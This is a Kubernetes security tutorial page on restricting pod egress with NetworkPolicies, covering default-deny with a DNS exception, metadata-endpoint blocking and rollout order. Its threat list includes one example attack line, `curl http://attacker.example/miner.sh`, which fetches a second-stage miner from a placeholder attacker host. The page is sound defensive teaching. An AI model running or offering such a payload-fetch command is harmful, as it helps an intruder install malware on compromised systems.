---
foundation:
  topic: Kubernetes Security
  group: Network Security
  slug: egress
  image: ../assets/network-security.svg
  order: 63
  title: "Egress"
  description: "Restricting where workloads are allowed to send traffic."
  publish: true
---

# Egress

Ingress control decides who gets in. Egress control decides what a compromised workload can do next, and the honest answer in most clusters is: anything.

Nearly every real intrusion needs outbound traffic after the initial foothold:

- **exfiltration:** stolen data has to leave somehow
- **command and control:** the implant phones home for instructions
- **tooling:** `curl http://attacker.example/miner.sh` to fetch the second stage
- **lateral movement outward:** the cloud metadata endpoint, internal APIs beyond the cluster

Default-deny egress converts a compromised pod from a beachhead into a dead end. It is also the control most teams skip, because it takes more care to roll out than ingress. The care is worth it.

## Default-Deny Egress Needs A DNS Exception

The naive default-deny egress policy breaks everything instantly, because pods cannot even resolve names anymore. The workable baseline pairs the deny with a DNS allowance to kube-dns:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: lab
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

On a cluster with an enforcing CNI (see the Network Policies page; kind's default CNI does not enforce), test it:

```bash
kubectl run client --image=busybox:1.36 -n lab --labels=app=client -- sleep 3600
kubectl exec -n lab client -- nslookup kubernetes.default.svc.cluster.local
kubectl exec -n lab client -- wget -qO- --timeout=2 http://example.com
```

Expected output:

```text
Name:      kubernetes.default.svc.cluster.local
Address 1: 10.96.0.1
...
wget: download timed out
command terminated with exit code 1
```

Names resolve; connections go nowhere. Exactly the posture you want as a starting point.

## Allow Specific Destinations

Internal flows are allowed by label, same as ingress. External destinations use `ipBlock`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-client-to-payments-api
  namespace: lab
spec:
  podSelector:
    matchLabels:
      app: client
  policyTypes: ["Egress"]
  egress:
    - to:
        - ipBlock:
            cidr: 203.0.113.10/32
      ports:
        - protocol: TCP
          port: 443
```

`ipBlock` also supports `except` for carve-outs. A common hardening move is allowing broad internet egress while blocking the cloud metadata endpoint:

```yaml
- to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except: ["169.254.169.254/32"]
```

## The FQDN Problem

Real dependencies are names, not CIDRs: `api.stripe.com` resolves to changing IPs behind a CDN. Vanilla NetworkPolicy has no answer for this. The options:

| Approach | Trade-off |
| --- | --- |
| Cilium `CiliumNetworkPolicy` with `toFQDNs` | DNS-aware allowlists; requires Cilium |
| Calico Enterprise DNS policy | Same idea; paid feature |
| Egress gateway / forward proxy | All egress exits via a proxy that allowlists names; works with any CNI |
| Pin CIDRs | Only viable for stable, small ranges you control |

The proxy pattern deserves a look even on clusters with FQDN-capable CNIs: it gives you an audit log of every outbound request, which is detection gold.

## Rollout Order

Egress deny breaks quietly: pods start failing on calls nobody documented. Roll out in this order:

1. Inventory outbound flows first: flow logs from your CNI (Cilium Hubble, Calico flow logs) or a temporary allow-all policy with logging.
2. Write the named allow policies for every legitimate flow you found.
3. Apply default-deny-egress (with DNS) to one low-risk namespace; soak; fix what breaks.
4. Expand namespace by namespace; new namespaces get the deny at provisioning time.
5. Add the metadata-endpoint block everywhere, including namespaces not yet under full deny.

## Clean Up

```bash
kubectl delete pod client -n lab
kubectl delete networkpolicy default-deny-egress allow-client-to-payments-api -n lab
```

## Practical Guidance

1. Treat egress control as a detection control too: denied egress attempts in CNI flow logs are one of the highest-signal alerts you can build.
2. Always ship the DNS exception with the deny, or you will roll the whole thing back on day one.
3. Block the cloud metadata endpoint (`169.254.169.254`) from pods that do not need it; it is the classic pivot from pod compromise to cloud credentials.
4. Use FQDN policies or an egress proxy for external dependencies; hand-pinned CDN CIDRs rot within months.
5. Namespace by namespace, inventory before deny; egress rollouts fail socially, not technically, when they break undocumented flows.
